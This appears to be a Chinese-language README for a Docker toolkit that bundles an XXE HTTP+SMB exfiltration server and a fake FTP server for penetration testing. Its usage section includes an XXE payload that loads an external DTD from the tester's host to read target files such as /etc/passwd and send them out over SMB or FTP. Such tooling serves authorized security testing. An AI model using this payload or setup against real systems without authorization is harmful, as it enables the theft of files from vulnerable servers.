# xxe-toolkits-server

一个将 **XXE HTTP+SMB 服务器** 与 **假 FTP 服务器（路径 sniffer）** 打包在同一 Docker 镜像中的小工具集，方便在 XXE / FTP 相关的安全测试中快速搭建环境。

包含两个上游项目的核心脚本：

- [`cwkiller/xxe-smb-server`](https://github.com/cwkiller/xxe-smb-server) 的 `xxe-smb-server.py`
- [`chain00x/fake-ftp-server`](https://github.com/chain00x/fake-ftp-server) 的 `1.py`（在本仓库中重命名为 `fake-ftp-server.py`）

> 仅用于安全测试与研究，请勿用于任何未授权环境。

---

## 功能概览

### 1. xxe-smb-server

- 内置一个 HTTP 服务器，返回用于 XXE 的 DTD payload。
- 同时启动一个 SMB 服务器（基于 `impacket.smbserver.SimpleSMBServer`）。
- 通过 XXE 将目标服务器的文件内容“外带”到 SMB 服务器。

原始运行方式（在宿主 Python 环境中）：

```bash
python3 xxe-smb-server.py public-ip-address [web-port] [-s share-path]
```

本镜像通过环境变量映射这几个参数，见下文。

---

### 2. fake-ftp-server（原 1.py）

- 一个简易的假 FTP 服务器，模拟 vsFTPd 3.0.3。
- 支持处理 `USER` / `PASS` / `PWD` / `CWD` / `RETR` / `EPSV` 等常见命令。
- 会记录所有收到的 `RETR` 路径（打印 + 可选写入日志文件），适合在一些场景中捕获/观察路径。
- **新增**：内置 HTTP 服务器，动态生成 `data.dtd` 用于 XXE 攻击，自动配置服务器 IP、FTP 端口和目标文件路径。

原始运行方式：

```bash
python3 fake-ftp-server.py <port> [选项]

# 示例
python3 fake-ftp-server.py 2121                           # 仅启动 FTP 服务器
python3 fake-ftp-server.py 2121 -w 8087                   # 启动 FTP + HTTP 服务器
python3 fake-ftp-server.py 2121 -w 8087 -f /etc/passwd    # 指定目标文件
python3 fake-ftp-server.py 2121 -w 8087 --ip 1.2.3.4      # 指定公网 IP
python3 fake-ftp-server.py 2121 -w 8087 -o data.log       # 保存捕获数据
```

同样通过环境变量映射到容器内参数。

---

## 容器暴露端口

容器内部默认监听：

- `XXE_SMB_WEB_PORT`（默认 `8088`）  
  `xxe-smb-server.py` 的 HTTP 服务器，用于提供 DTD payload。
- `445`  
  `SimpleSMBServer` 的 SMB 端口（**TCP 445**）。
- `FAKE_FTP_PORT`（默认 `2121`）  
  `fake-ftp-server.py` 的 FTP 监听端口。
- `FAKE_FTP_HTTP_PORT`（默认 `8087`）  
  `fake-ftp-server.py` 的 HTTP 服务器端口，用于提供 `data.dtd`。
- `FAKE_FTP_PASV_PORT`（默认 `2122`）  
  `fake-ftp-server.py` 的 FTP 被动模式端口。Docker 环境必须使用固定端口，否则随机端口无法正确暴露。

在提供的 `docker-compose.yml` 中示例映射为：

```yaml
ports:
  - "8088:8088"   # HTTP (xxe-smb-server)
  - "445:445"     # SMB
  - "2121:2121"   # fake-ftp-server
  - "8087:8087"   # HTTP (fake-ftp-server DTD)
  - "2122:2122"   # FTP 被动模式端口
```

> 注意：宿主机的 445 端口可能已被系统或其他服务占用，必要时可以改成 `1445:445` 之类的映射。

---

## 环境变量

容器启动时可以通过环境变量配置两套服务参数：

### xxe-smb-server（HTTP + SMB）

- `XXE_SMB_PUBLIC_IP`（必选，默认 `127.0.0.1`）

  对外提供给 XXE payload 使用的“公网 IP”或可达 IP，即脚本输出的 payload 中 `http://<public_ip>:<webport>/data.dtd` 的 IP 部分。

- `XXE_SMB_WEB_PORT`（可选，默认 `8088`）

  HTTP 服务器监听的端口。  
  如果设置为 `8088`，则 payload 中使用 `http://<public_ip>:8088/data.dtd`。

- `XXE_SMB_SHARE_PATH`（可选，默认 `/tmp/share`）

  SMB 服务器共享的目录路径（容器内路径）。XXE 请求最终读取的文件内容会通过 SMB 访问该共享。

这些变量在 `entrypoint.sh` 中会被映射到脚本调用：

```bash
python3 /app/xxe-smb-server/xxe-smb-server.py \
  "${XXE_SMB_PUBLIC_IP}" \
  "${XXE_SMB_WEB_PORT}" \
  -s "${XXE_SMB_SHARE_PATH}"
```

---

### fake-ftp-server（路径 sniffer + HTTP DTD 服务器）

- `XXE_FTP_PUBLIC_IP`（必选，默认 `127.0.0.1`）

  假 FTP 服务器对外提供给 XXE payload 使用的"公网 IP"或可达 IP。

- `FAKE_FTP_PORT`（必选，默认 `2121`）

  假 FTP 服务器监听端口。

- `FAKE_FTP_LOG_FILE`（可选，默认空）

  如果设置，则所有捕获到的 `RETR` 路径会被追加写入该文件。  
  例如 `/var/log/ftp_paths.log`。

- `FAKE_FTP_HTTP_PORT`（可选，默认 `8087`）

  HTTP 服务器端口，用于提供 `data.dtd` 文件供 XXE payload 调用。

- `FAKE_FTP_FILE_PATH`（可选，默认 `/etc/passwd`）

  XXE 攻击时要读取的目标文件路径。  
  Linux 系统可使用 `/etc/passwd`，Windows 系统可使用 `c:/windows/win.ini`。

- `FAKE_FTP_PASV_PORT`（可选，默认 `2122`）

  FTP 被动模式（PASV）使用的端口。  
  **Docker 环境强烈建议配置此项**，否则 FTP 客户端在被动模式下会尝试连接随机端口，由于 Docker 未暴露这些端口会导致连接失败。  
  设置为空字符串 `""` 可使用随机端口（仅适用于非 Docker 环境）。

对应调用为：

```bash
python3 /app/fake-ftp-server/fake-ftp-server.py ${FAKE_FTP_PORT} \
  --ip ${XXE_FTP_PUBLIC_IP} \
  --http-port ${FAKE_FTP_HTTP_PORT} \
  --file ${FAKE_FTP_FILE_PATH} \
  [--output ${FAKE_FTP_LOG_FILE}] \
  [--pasv-port ${FAKE_FTP_PASV_PORT}]
```

---

## 快速开始

### 1. 使用 docker-compose（推荐）

克隆本仓库：

```bash
git clone https://github.com/Mr-xn/xxe-toolkits-server.git
cd xxe-toolkits-server
```

编辑 `docker-compose.yml` 中的环境变量，特别是：

```yaml
XXE_SMB_PUBLIC_IP: "你的对外IP"
XXE_SMB_WEB_PORT: "8088"
XXE_FTP_PUBLIC_IP: "你的对外IP"
FAKE_FTP_PORT: "2121"
FAKE_FTP_HTTP_PORT: "8087"
FAKE_FTP_PASV_PORT: "2122"   # FTP 被动模式端口
FAKE_FTP_LOG_FILE: "/var/log/ftp_paths.log"
```

启动：

```bash
docker-compose up -d
```

容器启动后：

- 访问 HTTP（xxe-smb 生成 DTD payload 的 URL 示例）：

  ```text
  http://<XXE_SMB_PUBLIC_IP>:<XXE_SMB_WEB_PORT>/data.dtd
  ```

  注意：实际脚本中打印出的 usage/payload 会明确给出 `http://{public_ip}:{webport}/data.dtd`。

- SMB 服务监听在 TCP 445 端口：
  - 你可以从目标系统尝试访问 `\\<XXE_SMB_PUBLIC_IP>\SHARE\...`（场景视你的 XXE payload 而定）。

- 假 FTP 服务监听在 `FAKE_FTP_PORT` 上：
  - 使用任何 FTP 客户端连上，发出 `RETR` 等命令，观察容器日志及（可选）日志文件内容。

---

### 2. 直接使用已发布镜像（GitHub Packages）

如果你使用的是本仓库自带的 GitHub Actions workflow，将在 push 到 `main` 或打 tag 时自动构建并推送镜像到 GHCR：

```text
ghcr.io/Mr-xn/xxe-toolkits-server:latest
```

本地可直接拉取：

```bash
docker pull ghcr.io/mr-xn/xxe-toolkits-server:latest
```

示例运行（不使用 compose）：

```bash
docker run --rm \
  -e XXE_SMB_PUBLIC_IP=192.168.1.100 \
  -e XXE_SMB_WEB_PORT=8088 \
  -e XXE_SMB_SHARE_PATH=/share \
  -e XXE_FTP_PUBLIC_IP=192.168.1.100 \
  -e FAKE_FTP_PORT=2121 \
  -e FAKE_FTP_HTTP_PORT=8087 \
  -e FAKE_FTP_PASV_PORT=2122 \
  -e FAKE_FTP_FILE_PATH=/etc/passwd \
  -e FAKE_FTP_LOG_FILE=/var/log/ftp_paths.log \
  -p 8088:8088 \
  -p 445:445 \
  -p 2121:2121 \
  -p 8087:8087 \
  -p 2122:2122 \
  -v $(pwd)/share:/share \
  -v $(pwd)/logs:/var/log \
  ghcr.io/mr-xn/xxe-toolkits-server:latest
```

---

## 典型 XXE 测试流程示例

以下是一个基于 `xxe-smb-server` 的典型 XXE 测试流程，源于上游 README 并结合本镜像的变量：

1. 启动容器后，查看容器内脚本输出的 usage，其中包括类似：

   ```text
   Usage:
     1. 请发送如下XXE payload到目标服务器 
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE data [
     <!ENTITY % file SYSTEM "file:///">
     <!ENTITY % dtd SYSTEM "http://<XXE_SMB_PUBLIC_IP>:<XXE_SMB_WEB_PORT>/data.dtd"> %dtd;
     ]>
     <data>&send;</data>
     2. SMB 服务器将捕获文件内容
   ```

2. 将上述 payload 发送到存在 XXE 漏洞的目标服务。

3. 目标服务在解析时，会：
   - 通过 HTTP 请求 `http://<XXE_SMB_PUBLIC_IP>:<XXE_SMB_WEB_PORT>/data.dtd` 获取外部 DTD；
   - 由脚本返回一个 DTD，其中的实体定义会尝试读取本地文件并通过 SMB 发回。

4. 在容器日志中观察 `xxe-smb-server` 输出，以及 SMB 侧的捕获情况。

---

## fake-ftp-server 的使用说明

`fake-ftp-server.py` 的行为大致如下：

- 客户端连接后，伪装成 `vsFTPd 3.0.3`。
- 记录所有的 `RETR` 命令路径（相对当前 `CWD`）。
- 在连接结束后，打印所有收到的路径，并在配置了 `FAKE_FTP_LOG_FILE` 时写入文件。

这对于某些“文件路径探测”或攻击链调试场景（例如 SSRF 触发 FTP 请求等）特别有用：

1. 启动容器并确保 `FAKE_FTP_PORT` 端口映射到宿主机。
2. 在目标环境中（可能是 SSRF 或其他），构造 FTP URL/命令指向你的测试机。
3. 在容器日志和 `FAKE_FTP_LOG_FILE` 中查看被访问的路径。

---

## 安全与合规提示

- 本项目仅用于合法授权范围内的安全测试与学习研究。
- 在运行 SMB/FTP 等服务时，请确保你已获得目标环境和网络的明确授权。
- 不要在生产环境或者公共网络中随意暴露这些服务，避免带来不必要的安全风险。

---

## 致谢

本项目集成基于以下开源项目：

- [xxe-smb-server](https://github.com/cwkiller/xxe-smb-server) by [@cwkiller](https://github.com/cwkiller)
- [fake-ftp-server](https://github.com/chain00x/fake-ftp-server) by [@chain00x](https://github.com/chain00x)

如有使用建议或改进想法，欢迎提 Issue / PR。
